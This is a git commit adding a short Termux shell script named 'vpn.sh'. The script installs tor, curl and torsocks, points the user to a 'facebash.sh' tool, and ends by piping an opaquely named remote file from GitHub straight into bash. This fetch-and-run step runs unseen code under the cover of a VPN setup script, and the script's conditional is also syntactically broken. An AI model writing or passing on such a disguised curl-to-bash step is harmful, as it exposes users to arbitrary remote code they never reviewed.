b0af681a64e843cd321b18f1784a8a321aad1e9a
1-2-Tree <94172665+1-2-Tree@users.noreply.github.com>
2021-12-04 19:29:26 +0800

    Create vpn.sh

---
+++ vpn.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+chmod +x *
+if [[ command -v tor > /dev/null 2>&1;
+        command -v curl > /dev/null 2>&1;
+        command -v torsocks > /dev/null 2>&1 ]]; then
+                clear && echo "[+] All Done !!\n[+] You Can Run ./facebash.sh"
+        else pkg upgrade -y && pkg update -y
+                clear && echo "[+] Installing Requierd Files..." && sleep 5
+                pkg install -y tor curl torsocks
+                clear && echo "[+] All Done !!\n[+] You Can Run vpn "
+fi
+curl https://raw.githubusercontent.com/1-2-Tree/hide-change/main/739287372363827267282873372 | bash
